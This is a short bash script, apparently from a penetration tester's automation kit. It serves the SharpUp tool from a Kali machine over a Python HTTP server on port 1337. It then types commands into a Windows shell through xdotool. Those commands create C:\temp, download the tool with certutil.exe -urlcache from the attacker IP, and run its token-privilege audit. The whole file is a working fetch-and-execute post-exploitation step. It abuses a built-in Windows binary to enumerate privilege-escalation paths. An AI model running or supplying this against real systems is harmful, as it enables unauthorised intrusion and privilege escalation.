#!/bin/bash

: '
SharpUp - audit token privileges - cmd: download SharpUp to server and execute.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd ${SCRIPTS_DIR}/windows/permissions/.files
python3 -m http.server 1337 &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
xdotool key Return
sleep 0.8

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:1337/SharpUpent.exe ${TMP_FOLDER}\SharpUp.exe"
xdotool key Return
sleep 3

paste_command "${TMP_FOLDER}\SharpUp.exe audit TokenPrivileges"
xdotool key Return
sleep 10

kill $HTTP_PID
